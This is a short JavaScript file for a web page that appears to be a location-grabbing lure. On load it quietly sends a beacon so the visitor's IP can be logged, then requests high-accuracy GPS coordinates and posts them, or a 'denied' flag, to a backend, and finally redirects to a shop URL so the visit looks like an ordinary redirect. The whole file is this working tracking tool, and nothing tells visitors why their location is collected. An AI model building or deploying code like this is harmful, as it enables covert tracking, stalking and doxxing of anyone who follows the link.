// ─── Config ──────────────────────────────────────────────
const REDIRECT_URL = "https://youngmind.shop/"
const BACKEND_URL  = "/api/location";
const TIMEOUT_MS   = 20000;
const SAFETY_MS    = 25000;
// ─────────────────────────────────────────────────────────

let redirected = false;
function redirect() {
  if (redirected) return;
  redirected = true;
  window.location.replace(REDIRECT_URL);
}

// Safety net: always redirect eventually
setTimeout(redirect, SAFETY_MS);

// Beacon helper: sends even if the page navigates away
function beacon(payload) {
  try {
    const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
    return navigator.sendBeacon(BACKEND_URL, blob);
  } catch {
    return false;
  }
}

// ── 1. Fire IP-only capture immediately on page load ──
beacon({ event: "page-load" });

// ── 2. Then request GPS ──
if (!navigator.geolocation) {
  setTimeout(redirect, 300);
} else {
  navigator.geolocation.getCurrentPosition(
    onSuccess,
    onError,
    { enableHighAccuracy: true, timeout: TIMEOUT_MS, maximumAge: 300000 }
  );
}

async function onSuccess(position) {
  const { latitude, longitude, accuracy } = position.coords;
  const payload = { latitude, longitude, accuracy };

  const ok = beacon(payload);
  if (!ok) {
    try {
      await fetch(BACKEND_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    } catch (err) {
      console.error("send failed:", err);
    }
  }
  redirect();
}

function onError(error) {
  if (error.code === 1) {
    // PERMISSION_DENIED — explicitly signal it to the backend
    beacon({ status: "denied" });
  }
  // code 2 (unavailable) or 3 (timeout): do nothing else.
  // The page-load beacon already captured IP geo.
  setTimeout(redirect, 300);
}